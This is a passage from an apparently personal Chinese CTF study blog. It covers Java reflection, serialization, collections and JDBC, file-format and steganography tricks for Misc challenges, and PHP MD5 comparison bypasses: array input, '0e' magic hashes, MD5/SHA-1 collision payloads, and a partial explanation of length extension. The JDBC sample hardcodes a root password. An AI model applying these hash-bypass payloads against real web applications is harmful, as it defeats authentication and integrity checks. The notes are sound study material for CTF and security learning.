clazz.getMethod(&quot;sayHello&quot;);method.invoke(personInstance);Method methodWithArgs = clazz.getMethod(&quot;greet&quot;, String.class);methodWithArgs.invoke(personInstance, &quot;World&quot;);//获取构造方法Class&lt;?&gt; clazz = Person.class;Constructor&lt;?&gt; constructor = clazz.getConstructor(String.class, int.class);Object obj = constructor.newInstance(&quot;John&quot;, 30);\n\n\n\n还可以通过反射类区获取到接口和父类\nClass&lt;?&gt; clazz = Person.class;// 获取所有接口Class&lt;?&gt;[] interfaces = clazz.getInterfaces();for (Class&lt;?&gt; i : interfaces) &#123;    System.out.println(&quot;Interface: &quot; + i.getName());&#125;// 获取父类Class&lt;?&gt; superClass = clazz.getSuperclass();System.out.println(&quot;Superclass: &quot; + superClass.getName());\n\n\n\n至于其他各种类的方法，绝对是记不住的，到时候再去查吧\n24.序列化与反序列化不得不说java代码我感觉就比python代码好看一点，都是各种类和方法的调用，结果就是php中一个serialize，难道php要被淘汰因为php太高级了吗。一个序列化看了好久才懂\nJava 序列化是一种将对象转换为字节流的过程，以便可以将对象保存到磁盘上，将其传输到网络上，或者将其存储在内存中，以后再进行反序列化，将字节流重新转换为对象。\n序列化在 Java 中是通过 java.io.Serializable 接口来实现的，该接口没有任何方法，只是一个标记接口，用于标识类可以被序列化。\n当你序列化对象时，你把它包装成一个特殊文件，可以保存、传输或存储。反序列化则是打开这个文件，读取序列化的数据，然后将其还原为对象，以便在程序中使用。\n序列化是一种用于保存、传输和还原对象的方法，它使得对象可以在不同的计算机之间移动和共享，这对于分布式系统、数据存储和跨平台通信非常有用。\nSerializable接口\n实现 Serializable 接口： 要使一个类可序列化，需要让该类实现 java.io.Serializable 接口，这告诉 Java 编译器这个类可以被序列化\nSerializable接口是一个空接口，也就是说什么方法都不需要实现，只是implements Seializeable接口然后让java知道这个类可以被序列化\n序列化对象： 使用 ObjectOutputStream 类来将对象序列化为字节流，以下是一个简单的实例：\nimport java.io.Serializable;public class MyClass implements Serializable &#123;    // 类的成员和方法&#125;MyClass obj = new MyClass();try &#123;    FileOutputStream fileOut = new FileOutputStream(&quot;object.ser&quot;);//创建文件输出流    ObjectOutputStream out = new ObjectOutputStream(fileOut);//创建对象输出流    //对ObjectOutputStream这个类进行实例化    out.writeObject(obj);    //对obj这个类进行序列化    out.close();    fileOut.close();&#125; catch (IOException e) &#123;    e.printStackTrace();&#125;//object.ser本来是不存在的，经过序列化后创建这个文件储存序列化的二进制文件//上述代码将一个名为 &quot;object.ser&quot; 文件中的 obj 对象序列化。\n\n\n\n反序列化对象： 使用 ObjectInputStream 类来从字节流中反序列化对象，以下是一个简单的实例：\nMyClass obj = null;try &#123;    FileInputStream fileIn = new FileInputStream(&quot;object.ser&quot;);//创建文件读取流    ObjectInputStream in = new ObjectInputStream(fileIn);//创建对象输入流，包装文件输入流，由于反序列化     obj = (MyClass) in.readObject();//反序列化操作，readObject()返回的是Object类型，所以要进行强制类型转换    in.close();    fileIn.close();&#125; catch (IOException e) &#123;    e.printStackTrace();&#125; catch (ClassNotFoundException e) &#123;    e.printStackTrace();&#125;\n\n\n\n静态成员变量无法被序列化\n静态成员变量是属于类，无论是变量还是方法都不能被重写，于是无论访问属性还是调用方法虽然通过对象调用可以，但是和通过类调用的是一样的，于是被static修饰的属性无法被序列化\ntransient标识的对象成员变量不参与序列化\ntransient可以让属性不参与序列化这很简单，但是这个操作有什么重要的意义\nMyList 这个类定义了一个 arr 数组属性，初始化的数组长度为 100。在实际序列化时如果让 arr 属性参与序列化的话，那么长度为 100 的数组都会被序列化下来，但是我在数组中可能只存放 30 个数组而已，这明显是不可理的，所以这里就要自定义序列化过程啦，通过transient标识数组让其不参与\n我们可以通过writeObject和readObject进行自定义序列化和反序列化操作，该操作的定义可以覆盖transient的标识\n我们先来看下自定义序列化的简单使用\n    private void writeObject(ObjectOutputStream out) throws IOException &#123;        out.defaultWriteObject(); // 先执行默认序列化        // 对密码进行简单加密后再序列化        String encrypted = encrypt(password);        out.writeObject(encrypted);//对经过函数执行的字符串再进行序列化    &#125;    // 自定义反序列化逻辑    private void readObject(ObjectInputStream in)             throws IOException, ClassNotFoundException &#123;        in.defaultReadObject(); // 先执行默认反序列化        // 读取加密的密码并解密        String encrypted = (String) in.readObject();        this.password = decrypt(encrypted);    &#125;\n\n\n\n我们来看一个简单的代码\npublic class MyList implements Serializable &#123;     private String name;      /*    transient 表示该成员 arr 不需要被序列化     */    private transient Object[] arr;     public MyList() &#123;    &#125;     public MyList(String name) &#123;        this.name = name;        this.arr = new Object[100];        /*        给前面30个元素进行初始化         */        for (int i = 0; i &lt; 30; i++) &#123;            this.arr[i] = i;        &#125;    &#125;     @Override    public String toString() &#123;        return &quot;MyList&#123;&quot; +                &quot;name=&#x27;&quot; + name + &#x27;\\&#x27;&#x27; +                &quot;, arr=&quot; + Arrays.toString(arr) +                &#x27;&#125;&#x27;;    &#125;      //-------------------------- 自定义序列化反序列化 arr 元素 ------------------     /**     * Save the state of the &lt;tt&gt;ArrayList&lt;/tt&gt; instance to a stream (that     * is, serialize it).     *     * @serialData The length of the array backing the &lt;tt&gt;ArrayList&lt;/tt&gt;     * instance is emitted (int), followed by all of its elements     * (each an &lt;tt&gt;Object&lt;/tt&gt;) in the proper order.     */    private void writeObject(java.io.ObjectOutputStream s)            throws java.io.IOException &#123;        //执行 JVM 默认的序列化操作        s.defaultWriteObject();          //手动序列化 arr  前面30个元素        for (int i = 0; i &lt; 30; i++) &#123;            s.writeObject(arr[i]);//通过writeObject对arr数组进行序列化        &#125;    &#125;     /**     * Reconstitute the &lt;tt&gt;ArrayList&lt;/tt&gt; instance from a stream (that is,     * deserialize it).     */    private void readObject(java.io.ObjectInputStream s)            throws java.io.IOException, ClassNotFoundException &#123;         s.defaultReadObject();        arr = new Object[30];         // Read in all elements in the proper order.        for (int i = 0; i &lt; 30; i++) &#123;            arr[i] = s.readObject();        &#125;    &#125;&#125; \n\n\n\n\n\n25.数据结构java中有很多C语言中没有学过的数据结构，比如列表和集合等。而且在java中很多数据结构属于对象，不愧是面向对象编程的语言\nJava 的 java.util 包中提供了许多这些数据结构的实现，可以根据需要选择合适的类\n数组(Arrays)\n之前就看过java中的数组了，比较不同的是java中的数组分为声明和创建两部分，声明的时候不分配内存，和C语言中指针有点像\nint size = 10;      // 定义数组double[] myList = new double[size];//通过double[] myList声明 再通过new创建对象\n\n\n特点： 固定大小，存储相同类型的元素。\n优点： 随机访问元素效率高。\n缺点： 大小固定，插入和删除元素相对较慢\n\n列表(List)\nJava 提供了多种列表实现，如 ArrayList 和 LinkedList。\nList&lt;String&gt; arrayList = new ArrayList&lt;&gt;();List&lt;Integer&gt; linkedList = new LinkedList&lt;&gt;();//应该也是有很多方法可以去操作的\n\nArrayList:\n\n特点： 动态数组，可变大小。\n优点： 高效的随机访问和快速尾部插入。\n缺点： 中间插入和删除相对较慢。\n\nLinkedList:\n\n特点： 双向链表，元素之间通过指针连接。\n优点： 插入和删除元素高效，迭代器性能好。\n缺点： 随机访问相对较慢。\n\n集合(Sets)\n集合（Sets）用于存储不重复的元素，常见的实现有 HashSet 和 TreeSet。感觉和数学中的集合一样不会储存重复的元素\nSet&lt;String&gt; hashSet = new HashSet&lt;&gt;();Set&lt;Integer&gt; treeSet = new TreeSet&lt;&gt;();\n\nHashSet:\n\n特点： 无序集合，基于HashMap实现。\n优点： 高效的查找和插入操作。\n缺点： 不保证顺序。\n\nTreeSet:\n\n特点：TreeSet 是有序集合，底层基于红黑树实现，不允许重复元素。\n优点： 提供自动排序功能，适用于需要按顺序存储元素的场景。\n缺点： 性能相对较差，不允许插入 null 元素。\n\n关于List和Set没想到都是集合框架的核心接口，没想到集合接口中原来不止有集合吗，仔细一看还有队列等各种数据结构，看了集合框架是各种数据结构接口的统一的架构\n映射(Maps)\n映射（Maps）用于存储键值对，常见的实现有 HashMap 和 TreeMap。\nMap&lt;String, Integer&gt; hashMap = new HashMap&lt;&gt;();Map&lt;String, Integer&gt; treeMap = new TreeMap&lt;&gt;();\n\nHashMap:\n\n特点： 基于哈希表实现的键值对存储结构。\n优点： 高效的查找、插入和删除操作。\n缺点： 无序，不保证顺序。\n\nTreeMap:\n\n特点： 基于红黑树实现的有序键值对存储结构。\n优点： 有序，支持按照键的顺序遍历。\n缺点： 插入和删除相对较慢。\n\n栈(Stack)\n栈（Stack）是一种线性数据结构，它按照后进先出（Last In, First Out，LIFO）的原则管理元素。在栈中，新元素被添加到栈的顶部，而只能从栈的顶部移除元素。这就意味着最后添加的元素是第一个被移除的。\nStack&lt;Integer&gt; stack = new Stack&lt;&gt;();\n\nStack 类:\n\n特点： 代表一个栈，通常按照后进先出（LIFO）的顺序操作元素。\n\n队列(Queue)\n队列（Queue）遵循先进先出（FIFO）原则，常见的实现有 LinkedList 和 PriorityQueue。\nQueue&lt;String&gt; queue = new LinkedList&lt;&gt;();\n\nQueue 接口:\n\n特点： 代表一个队列，通常按照先进先出（FIFO）的顺序操作元素。\n实现类： LinkedList, PriorityQueue, ArrayDeque。\n\n其他数据结构我就不抄了，毕竟我不写算法也不搞开发，总体就是java中和C语言数据结构不同的就是C语言中需要自己使用数组，结构体，指针等去构造数据结构，而是由专门的接口和类可用于实现数据接口\nList&lt;String&gt; arrayList = new ArrayList&lt;&gt;();//List&lt;String&gt;属于接口类型 定义了一个arryList的接口// new ArrayList&lt;&gt;(); 通过实例化一个对象实现接口//于是后面可以通过arryList接口去调用java中为列表准备的各种方法\n\n\n\n\n\n\n\n\n\n26.集合框架难死了，不知道为什么还是看不懂java的代码，CTF之路难道要死在java手上了吗。\n看了很久后发现集合框架中并不是专门和集合这个数据结构有关，说不定真的只是字面意思的集合，只是把所有数据结构的接口集合到一起，至于关系就有点难，而且对我来说没什么用\n集合框架被设计成要满足以下几个目标。\n\n该框架必须是高性能的。基本集合（动态数组，链表，树，哈希表）的实现也必须是高效的。\n该框架允许不同类型的集合，以类似的方式工作，具有高度的互操作性。\n对一个集合的扩展和适应必须是简单的。\n\n这个完全看不懂，我认为就是需要可以直接通过接口的实现使用到对应的数据结构。然后数据结构的操作需要以类似的方式实现，这也为后面的以Collention衍生出来的子类型提供基础。最后就是集合框架需要包含大部分的数据结构。\n说了这么多我认为集合框架就是数据结构的操作需要很多方法去实现，但是数据结构过多需要实现的方法也过多使用方式会有很大的不同。于是为了方便进行数据结构的操作，就将这些数据结构操作的接口集合起来，统一方法，比如各种数据结构的添加方法都是add();，删除都是remove();\n然后就是集合框架中也会出现各种接口的实现类\n于是java为了减少学习成本，比如将Collection接口作为基准接口，从中衍生出来的接口都有Collection中的方法，具体实现则取决于实现接口的类\n我们直接上一张清朝老图\n\n\n看见了吗，复杂到我这辈子都不可能去记住的，也就只能看看\n从上面的集合框架图可以看到，Java 集合框架主要包括两种类型的容器，一种是集合（Collection），存储一个元素集合，另一种是图（Map），存储键&#x2F;值对映射。Collection 接口又有 3 种子类型，List、Set 和 Queue，再下面是一些抽象类，最后是具体实现类，常用的有 ArrayList、LinkedList、HashSet、LinkedHashSet、HashMap、LinkedHashMap 等等。\n集合框架是一个用来代表和操纵集合的统一架构。所有的集合框架都包含如下内容：\n\n接口：是代表集合的抽象数据类型。例如 Collection、List、Set、Map 等。之所以定义多个接口，是为了以不同的方式操作集合对象\n实现（类）：是集合接口的具体实现。从本质上讲，它们是可重复使用的数据结构，例如：ArrayList、LinkedList、HashSet、HashMap。\n算法：是实现集合接口的对象里的方法执行的一些有用的计算，例如：搜索和排序，这些算法实现了多态，那是因为相同的方法可以在相似的接口上有着不同的实现。\n\n除了集合，该框架也定义了几个 Map 接口和类。Map 里存储的是键&#x2F;值对。尽管 Map 不是集合，但是它们完全整合在集合中。\n也就是说集合框架并不是一种什么数据类型，而是一种java中实现数据结构算法的一种接口继承模式吧，是一种方便与我们去读写代码的一种规则。\n然后还有其他关于接口和实现类的介绍和使用就算了，CTF遇到的时候再去DS。\n27.数据库操作不愧是java，数据库操作也比php难，搞了半天也没弄好数据连接，就好像当初php连接数据库一样，但是那次是被坑了，这次还要等着下什么Mysql驱动，在过了很久之后终于可以进行Mysql连接了\n数据库连接\n首先我们需要在java项目中添加MySQL连接的JDBC驱动\n下载下来解压后会得到一个.jar的文件，我们在IDEA中打开项目结构然后在库中添加我们刚才解压出来的.jar文件，然后应用。\n然后在IDEA右上角的数据库中添加MySQL的数据源，然后就可以进行数据库的连接了。\n但是进行数据库连接和PHP有点不同\nimport java.sql.Connection;import java.sql.DriverManager;import java.sql.SQLException;public class MySQLDemo &#123;    // JDBC URL、用户名和密码    private static final String URL = &quot;jdbc:mysql://localhost:3306/your_database?useSSL=false&amp;serverTimezone=UTC&quot;;    private static final String USER = &quot;root&quot;;    private static final String PASSWORD = &quot;123456&quot;;    public static void main(String[] args) &#123;        try &#123;            // 1. 加载驱动（MySQL 8.0+ 可省略）            Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;);                        // 2. 获取数据库连接            Connection connection = DriverManager.getConnection(URL, USER, PASSWORD);//数据库连接代码比PHP多了一个URL            System.out.println(&quot;数据库连接成功！&quot;);                        // 3. 关闭连接（重要！）            connection.close();        &#125; catch (ClassNotFoundException | SQLException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;\n\n数据库连接使用的是DriverManager类的getConnection方法，但是参数比PHP多了一个URL，我们来看下URL\nprivate static final String URL = &quot;jdbc:mysql://localhost:3306/your_database?useSSL=false&amp;serverTimezone=UTC&quot;;//这里面我们需要修改的就是ip localhost//MySQL端口 3306//和我们要连接数据库的名字 your_dadtabase\n\n\n\n执行SQL语句\n我们直接来看代码\nimport java.sql.*;public class QueryDemo &#123;    public static void main(String[] args) &#123;        try (Connection conn = DriverManager.getConnection(URL, USER, PASSWORD)) &#123;//先进行数据库连接  创建Connection对象            // 1. 创建Statement对象            Statement stmt = conn.createStatement();                        // 2. 执行SQL查询            String sql = &quot;SELECT id, name, age FROM users&quot;;            ResultSet rs = stmt.executeQuery(sql);//通过Statement类的executeQuery进行sql执行 返回ResultSet对象的执行结果                        // 3. 遍历结果集            while (rs.next()) &#123;                int id = rs.getInt(&quot;id&quot;);                String name = rs.getString(&quot;name&quot;);                int age = rs.getInt(&quot;age&quot;);                System.out.println(&quot;ID: &quot; + id + &quot;, Name: &quot; + name + &quot;, Age: &quot; + age);            &#125;                        // 4. 关闭资源（反向顺序）            rs.close();            stmt.close();        &#125; catch (SQLException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;\n\n我们可以看到先是通过Connection类的createStatement方法创建Statement对象，然后再调用Statement类的executeQuery进行sql语句的执行，最后返回一个ResultSet对象\n","tags":["Java"]},{"title":"Misc","url":"/2025/04/17/Misc/","content":"Misc学习笔记前言现在写buu有点写不动了，最近还有点感冒，状态不好。服了，感冒吃药七天好，不吃药大概一周好，感冒麻了。反正杂项迟早要学的，现在学一下还放松一下\n1.文件区我们做题的时候有时候会直接给我们压缩包或者图片各种文件，我们需要从文件中找出flag，我的话只写一些我们需要手动的地方，直接用工具的就算了\n\n\n1.zip文件格式\n文件格式主要就是观察文件头和尾，找出隐藏的压缩包\n​        •头标识 50 4B 03 04\n​        •版本号，头标识后面四位\n​        •加密情况，版本号后面两位，00为未加密，其余通常为加密\n\n\n\n\n伪加密\n当我们的各种解压软件失败后，我们就会尝试用爆破的方法去把密码爆破出来(这也算是为数不多在现实生活中有用的技能了)，但是当我们爆破出错的时候我们可以怀疑该压缩包未被加密，而是被人为恶意修改了加密情况(也就是16进制的第6组数)\n我们只需要把第6组数字改回00即可，但是这是一层文件伪加密。我们面对压缩包中存在一个伪加密的压缩包的时候修改的地方有点不一样\n我们先来看下，文件数据\n压缩源文件数据区          50 4B 03 04：这是头文件标记  （0x04034b50）          14 00：解压文件所需 pkware 版本          00 00：全局方式位标记（判断有无加密）          08 00：压缩方式          5A 7E：最后修改文件时间          F7 46：最后修改文件日期\n\n我们正常情况是修改6号16进制\n压缩源文件目录区         50 4B 01 02：目录中文件文件头标记  （0x02014b50）         1F 00：压缩使用的 pkware 版本         14 00：解压文件所需 pkware 版本         00 00：全局方式位标记（判断是否为伪加密）         08 00：压缩方式          5A 7E：最后修改文件时间          F7 46：最后修改文件日期\n\n我们发现当压缩包中存在压缩包伪加密时中间多了两个数据，我们需要更改8号数据\n密码爆破\n这个题目一般都会有提示，我们使用工具ARCHPR进行爆破\n2.png文件格式\n\n头识标，89 50 4E 47 0D 0A 1A 0A\n宽度位0x10-0x13，不可随意更改，需根据CRC值修改\n高度位0x14-0x17，可随便改\nCRC校验位0x1D-0x20，CRC是对文件数据块的校验，修改数据块会使校验失败，文件无法正常显示\n\n\n\n\n\n数据块\n我们闲着没事做还可以去了解一下除数据头和尾以外的16进制数据内容\n对于一个 PNG 文件来说，其文件头总是由位固定的字节来描述的，剩余的部分由 3 个以上的 PNG 的数据块（Chunk）按照特定的顺序组成。\n文件头 89 50 4E 47 0D 0A 1A 0A + 数据块 + 数据块 + 数据块……\nPNG 定义了两种类型的数据块，一种是称为关键数据块（critical chunk），这是标准的数据块，另一种叫做辅助数据块（ancillary chunks），这是可选的数据块。关键数据块定义了 4 个标准数据块，每个 PNG 文件都必须包含它们，PNG 读写软件也都必须要支持这些数据块。\n对于每个数据块都有着统一的数据结构，每个数据块由 4 个部分组成\n\n\n\n名称\n字节数\n说明\n\n\n\nLength（长度）\n4 字节\n指定数据块中数据域的长度，其长度不超过（231－1）字节\n\n\nChunk Type Code（数据块类型码）\n4 字节\n数据块类型码由 ASCII 字母（A - Z 和 a - z）组成\n\n\nChunk Data（数据块数据）\n可变长度\n存储按照 Chunk Type Code 指定的数据\n\n\nCRC（循环冗余检测）\n4 字节\n存储用来检测是否有错误的循环冗余码\n\n\nCRC（Cyclic Redundancy Check）域中的值是对 Chunk Type Code 域和 Chunk Data 域中的数据进行计算得到的。\n高度显示不完整\n当我们图片显示不完整的时候，我们可以根据图片显示的具体情况去修改高度和宽度\n高度有点低，修改一下，把01改成02，保存\n\n\n\n\n宽度显示不完整\n需根据爆破文件的CRC值修改宽度，否则会打开文件失败\nLSB隐写\n我们可以使用stegslove或者kali去看，虽然他们说Kali看的全一点，但是我感觉stegslove够用了\n我们使用stegslove中Analyse-&gt;Date Extract\n\n\n勾选后面三个0，模式一般都是RGB，发现没有的话，可以尝试换一个模式\n再点Preview，数据拖到最上方\n\n\n发现flag\nkali则是使用zsteg，但是我没用过\n3.jpg没想到不同后缀的图片内容这么多差别\n文件结构\n\nJPEG 是有损压缩格式，将像素信息用 JPEG 保存成文件再读取出来，其中某些像素值会有少许变化。在保存时有个质量参数可在 0 至 100 之间选择，参数越大图片就越保真，但图片的体积也就越大。一般情况下选择 70 或 80 就足够了\nJPEG 没有透明度信息\n\nJPG 基本数据结构为两大类型：「段」和经过压缩编码的图像数据。\n\n\n\n名 称\n字节数\n数据\n说明\n\n\n\n段 标识\n1\nFF\n每个新段的开始标识\n\n\n段类型\n1\n\n类型编码（称作标记码）\n\n\n段长 度\n2\n\n包括段内容和段长度本身, 不包括段标识和段类型\n\n\n段内容\n2\n\n≤65533 字节\n\n\n\n有些段没有长度描述也没有内容，只有段标识和段类型。文件头和文件尾均属于这种段。\n段与段之间无论有多少 FF 都是合法的，这些 FF 称为「填充字节」，必须被忽略掉。\n\n我们没有必要去关心数据是这么构成的，我们还是优先记住文件头即可\n​        •头识标，FF D8\n​        •尾识标，FF D9\n其他就和png文件差不多了\n4.GIF一个 GIF 文件的结构可分为\n\n文件头（File Header）\nGIF 文件署名（Signature）\n版本号（Version）\n\n\nGIF 数据流（GIF Data Stream）\n控制标识符\n图象块（Image Block）\n其他的一些扩展块\n\n\n文件终结器（Trailer）\n\n头标识\n47 49 46 38（GIF8）\n但是之前我们文件头伪造的时候不是写的GIF89a吗\n5.文件分离这个主要是直接用binwalk和foremost直接梭哈就行了，但是有时候需要用到手动分离，但是我还没遇到这种题目，我以后遇到了再来补这里\n"},{"title":"Misc工具收集","url":"/2025/10/14/Misc%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/","content":"Misc工具收集这里就收集一些冷门的隐写工具使用方式，怕忘记了\nSteghide(图像隐写工具)可以在jpeg、bmp、wmv、au文件中隐写信息的软件\n下载\n下载地址 windows：https://sourceforge.net/projects/steghide/\n使用方法\n# 将隐藏信息从载体中分离出来steghide extract -sf 待提取信息的图片.jpg -p 123456# -sf 后面放待提取信息的图片# -p 后面接密码，也可以不加-p参数，运行后会询问密码# 若没有密码，则不加-p参数，询问密码直接按enter键跳过# 将文件隐藏到载体中steghide embed -cf 隐藏信息的载体.jpg -ef 待隐藏的信息.txt -p 123456# -cf 后面放隐藏信息的载体# -ef 待隐藏的信息# 查询载体有没有隐藏信息steghide info 可能含有隐藏信息的载体\n\n使用实例\n\n\n\n\nstegosaurus(pyc文件隐写)中文翻译过来就是剑龙，专门用来进行pyc文件隐写，pyc文件是py文件的编译文件\n项目地址\n使用方法\npython3 stegosaurus.py -x O_O.pyc\n\n\n\n\n\n\n\n"},{"title":"MD5","url":"/2025/03/30/MD5/","content":"MD5笔记前言写了一些CTF的题目后发现md5()这个函数考得太多了，绕过的方法又有点难和，现在我必须要去总结一些MD5的绕过方法\n1.数组绕过法最简单的应该就是数组绕过法，md5()的一个特性，当参数为数组时自动返回1\n$a=$_POST[&#x27;a&#x27;];$b=$_POST[&#x27;b&#x27;];if($a!==$b&amp;&amp;md5($a)===md5($b))\n\n我们只需要传入两个不同的数组即可a[]&#x3D;1&amp;b[]&#x3D;2\n2.0e科学计数绕过法如果对输入内容进行强制类型转化，我们就无法使用数组绕过法\n$apple = (string)$_POST[&#x27;appple&#x27;];$banana = (string)$_POST[&#x27;bananana&#x27;];if (!((string)$apple != (string)$banana &amp;&amp; md5((string)$apple) == md5((string)$banana))) &#123;    die(&#x27;难吗?不难!&#x27;);&#125; \n\n我们这个时候可以通过php比较时的类型转化\n&lt;?phpvar_dump(&#x27;0e123&#x27;==&#x27;0e456&#x27;);//true\n\n这个和php版本有关，应该是要大于8才能对字符串进行科学计数法检查\n这个时候就要利用0e的形式来解题，找到两个不同字符，md5加密后却都是0e324234的形式。如何寻找这样的字符串？\n# -*- coding: utf-8 -*-import multiprocessingimport hashlibimport randomimport stringimport sysCHARS = string.ascii_letters + string.digitsdef cmp_md5(substr, stop_event, str_len, start=0, size=20):    global CHARS    while not stop_event.is_set():        rnds = &#x27;&#x27;.join(random.choice(CHARS) for _ in range(size))        md5 = hashlib.md5(rnds)        value = md5.hexdigest()        if value[start: start + str_len] == substr:            # print rnds            # stop_event.set()            # 碰撞双md5            md5 = hashlib.md5(value)            if md5.hexdigest()[start: start + str_len] == substr:                print rnds + &quot;=&gt;&quot; + value + &quot;=&gt;&quot; + md5.hexdigest() + &quot;\\n&quot;                stop_event.set()if __name__ == &#x27;__main__&#x27;:    substr = sys.argv[1].strip()    start_pos = int(sys.argv[2]) if len(sys.argv) &gt; 1 else 0    str_len = len(substr)    cpus = multiprocessing.cpu_count()    stop_event = multiprocessing.Event()    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,                                                               stop_event, str_len, start_pos))                 for i in range(cpus)]    for p in processes:        p.start()    for p in processes:        p.join()\n\n脚本寻找要浪费大概十分钟左右的时间才能找出一个，可以用网上现成的，如果题目要求比较特殊的话，再利用自己的脚本跑\nMAUXXQC 0e478478466848439040434801845361IHKFRNS 0e256160682445802696926137988570GZECLQZ 0e537612333747236407713628225676GGHMVOE 0e362766013028313274586933780773GEGHBXL 0e248776895502908863709684713578EEIZDOI 0e782601363539291779881938479162DYAXWCA 0e424759758842488633464374063001\n\n3.md5碰撞假如我们把之前的代码改一下\n$apple = (string)$_POST[&#x27;appple&#x27;];$banana = (string)$_POST[&#x27;bananana&#x27;];if (!((string)$apple != (string)$banana &amp;&amp; md5((string)$apple) === md5((string)$banana))) &#123;    die(&#x27;难吗?不难!&#x27;);&#125; \n\n由于使用了!&#x3D;&#x3D;导致不会进行类型转换，我们也无法利用科学计数法绕过，这个时候就需要MD5碰撞\nMD5碰撞就是两串不一样的字符串，经过MD5加密后结果却相同\n$a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2$b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2\n\n原谅我看不懂大佬的payload，我自己用md5加密出来不一样，等下去题目里面试试\n经过验证，这个payload是对的，我自己错误的原因是由于原来的数据全是乱码，这是经过url编码的数据，MD5之前需要解码\n再贴一个SHA1碰撞\na=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1b=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1\n\n\n\n4.HASH长度拓展攻击我在写Base_CTF新生赛算是长见识了，一个MD5这么这么难，还需要去学MD5的HASH长度拓展攻击，我也是看了一下\n1.原理简单的说，由于HASH的生成机制原因，使得我们可以人为的在原先明文数据的基础上添加新的拓展字符，使得原本的加密链变长，进而控制加密链的最后一节，使得我们得以控制最终结果。\n也就是我们人为的去控制加密链，控制最后一次加密的加密链和原始数据，我们就可以控制加密结果\n2.MD5长度拓展攻击&lt;?phpinclude &quot;flag.php&quot;;$secretKey = &#x27;xxxxxx&#x27;; #xxx为未知内容，但长度已知为6。$v1 = $_GET[&#x27;str&#x27;];$sign = $_GET[&#x27;sign&#x27;];$token = md5($secretKey.$v1);if($v1 === &#x27;test&#x27;) &#123;    die($token); #token=2df51a84abc64a28740d6d2ae8cd7b16&#125; else &#123;    if($token === $sign) &#123;        die($flag);    &#125;&#125;?&gt;\n\n 这个我们需要在不知道secretKey的情况下知道它和str拼接后的MD5值，这正常来看是不可能的\n而由于我们无法知道变量$secretKey的内容，所以无法得到$token的值，故而看似是没有办法获取到flag的死局，而这时便轮到我们的拓展攻击来大显身手了。\n MD5算法流程\n若想搞清楚原理，其算法的流程是必须了解的。不过我们无需去关心那些复杂的运算，只需要知道的大概的一个流程就OK了。\n这里借一张神图：\n看不懂也没关系，相信你看完我这篇文章后再返回来看这张图就很清晰明了了。\nMD5对原始数据的分块处理\n我们还是举个例子，对于字符串aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbb（64个a、3个b）。长度为19个字符，且根据ASCII表，字符a、b的十六进制分别为0x61、0x62。\n\n\n这是转化为16进制的结果\n而我们知道，1位十六进制相当于4位二进制表示(16=2^4)。所以对于64个字符a的长度来说，其二进制长度为：字符长度*二进制位数2*十六进制转二进制位数拓展4=64*2*4=512。\n也就是说在MD5的运算中原始数据会先转化为16进制，在变为2进制，64个字母变为512个二进制数据\n对于MD5算法来说，我们需要将原数据进行分块处理，以512位个二进制数据为一块。”最后“一块的处理分为以下几种情况：\n\n明文数据的二进制数据长度&lt;&#x3D;448，填充padding(无意义占位)数据使其长度为448，再添加原始明文数据的二进制长度信息（64位）使其长度为512位即可。\n448&lt;明文数据的二进制数据长度&lt;&#x3D;512，填充padding数据至下一块的448位，而后再添加原始明文数据的二进制长度信息（64位）使其长度为512位即可。\n\n两种情况如下图：\n\n\n\n\n最后的16进制转10进制后对应的是字符数的二级制位数\n注意：每块数据的长度均为512位二进制，图中的数据我没有全都用二进制来表示，将明文数据分块之后就可以与向量进行运算了。\n对于padding数据（长度不定）来说：首位二进制位1，其余位为0.\n对于长度信息位（长度8Byte&#x3D;64bit）来说，从低位向高位数，如上图的长度信息：f0 03 00 00 00 00 00 